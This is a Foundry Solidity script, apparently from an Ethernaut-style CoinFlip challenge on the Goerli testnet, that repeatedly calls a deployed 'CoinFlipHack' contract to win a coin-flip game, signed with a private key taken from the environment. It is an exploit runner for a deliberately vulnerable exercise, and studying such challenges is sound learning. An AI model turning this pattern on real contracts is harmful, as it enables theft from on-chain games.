// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/CoinFlipHack.sol";
import "../src/CoinFlip.sol";

// Once we know/set up our coin flip and coinfliphack contracts we can jsut use thsi to call our
// hack contract over and over.
contract CoinFlipHackExploitScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    vm.startBroadcast(attackerPrivateKey);
    CoinFlip coinFlipContract = CoinFlip(address(0xCF2b9D791391c33339275D1FC3245D9D3a003b58));

    coinFlipContract.consecutiveWins();
    // My coin flip hack address on goereli
    CoinFlipHack coinFlipHack = CoinFlipHack(address(0x3c63b18C32FD8213c37f7b228CFB901221771EF9));

    coinFlipHack.makeGuess();

    coinFlipContract.consecutiveWins();

    vm.stopBroadcast();
  }
}